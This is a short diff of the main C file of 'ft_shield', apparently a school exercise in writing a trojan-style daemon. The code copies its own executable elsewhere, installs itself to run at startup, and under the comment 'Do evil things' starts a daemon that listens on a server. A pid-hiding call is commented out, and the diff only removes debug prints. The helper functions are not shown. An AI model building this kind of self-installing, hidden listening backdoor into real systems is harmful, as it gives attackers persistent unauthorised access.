@@ -1,5 +1,4 @@
 #include "../includes/ft_shield.h"
-FILE *debug_fp = NULL;
 // Check PATH where it is executed
 // ANSWER: readlink to retrive full path of the executable
 // https://stackoverflow.com/questions/933850/how-do-i-find-the-location-of-the-executable-in-c
@@ -13,15 +12,12 @@ int main ( void )
     if (strcmp(buf, EXECUTABLE_FILE)) {
         printf("robrodri & jalvarad.\n");
         copy_payload(buf);
-        printf("Payload copied.\n");
         // systems without systemctl will not work
         startup_setup();
-        printf("Setup done.\n");
     }
     else { // Do evil things
         //hide_pid();
         t_daemon *daemon = create_daemon();
-        system ("echo 'matt_daemon' > /home/ubuntu/ft_shield/ft_shield.log");
         server_listen(daemon);
         free(daemon);
     }
